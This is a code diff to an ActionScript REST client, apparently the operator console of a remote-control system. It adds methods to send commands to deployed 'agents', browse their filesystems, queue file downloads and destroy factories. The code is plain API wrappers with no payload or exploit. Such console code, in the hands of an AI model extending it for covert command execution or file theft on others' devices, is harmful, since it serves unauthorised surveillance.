@@ -36,6 +36,12 @@ package it.ht.rcs.console.agent.rest
       resp.token = destroy_(JSON.stringify({_id: id, permanent: permanent}));
     }
     
+    public function destroy_factory(id:String, permanent:Boolean=false, onResult:Function=null, onFault:Function=null):void
+    {
+      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
+      resp.token = destroy_factory_(JSON.stringify({_id: id, permanent: permanent}));
+    }
+    
     public function purge(id:String, time:Number, size:Number, onResult:Function=null, onFault:Function=null):void
     {
       var resp:CallResponder = DB.getCallResponder(onResult, onFault);
@@ -95,16 +101,18 @@ package it.ht.rcs.console.agent.rest
       resp.token = downloads_(agent._id);
     }
     
-    public function create_download(agentId:String, path:String, onResult:Function=null, onFault:Function=null):void
+    public function filesystems(agent:Agent, onResult:Function=null, onFault:Function=null):void
     {
       var resp:CallResponder = DB.getCallResponder(onResult, onFault);
-      resp.token = create_download_(JSON.stringify({ _id: agentId, download: {path: path} }));
+      resp.token = filesystems_(agent._id);
     }
     
-    public function destroy_download(agent:Agent, downloadId:String, onResult:Function=null, onFault:Function=null):void
+
+    
+    public function destroy_filesystem(agent:Agent, filesystemId:String, onResult:Function=null, onFault:Function=null):void
     {
       var resp:CallResponder = DB.getCallResponder(onResult, onFault);
-      resp.token = destroy_download_(JSON.stringify({ _id: agent._id, download: downloadId }));
+      resp.token = destroy_filesystem_(JSON.stringify({ _id: agent._id, filesystem: filesystemId }));
     }
     
     public function destroy_upload(agent:Agent, uploadId:String, onResult:Function=null, onFault:Function=null):void
@@ -141,6 +149,38 @@ package it.ht.rcs.console.agent.rest
     {
       var resp:CallResponder = DB.getCallResponder(onResult, onFault);
       resp.token = move_(JSON.stringify({ _id: agentId, target: targetId}));
+    }
+    
+    public function commands(agent:Agent, onResult:Function=null, onFault:Function=null):void
+    {
+      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
+      resp.token = exec_(agent._id);
+    }
+    
+    public function create_download(agentId:String, path:String, onResult:Function=null, onFault:Function=null):void
+    {
+      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
+      resp.token = create_download_(JSON.stringify({ _id: agentId, download: {path: path} }));
+    }
+    
+    public function create_command(agent:Agent, command:String, onResult:Function=null, onFault:Function=null):void
+    {
+      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
+      resp.token = create_exec_(JSON.stringify({ _id: agent._id, exec: {command:command} }));
+    }
+    
+    
+    
+    public function destroy_download(agent:Agent, downloadId:String, onResult:Function=null, onFault:Function=null):void
+    {
+      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
+      resp.token = destroy_download_(JSON.stringify({ _id: agent._id, download: downloadId }));
+    }
+    
+    public function destroy_command(agent:Agent, commandId:String, onResult:Function=null, onFault:Function=null):void
+    {
+      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
+      resp.token = destroy_exec_(JSON.stringify({ _id: agent._id, exec: commandId }));
     }
     
     /**
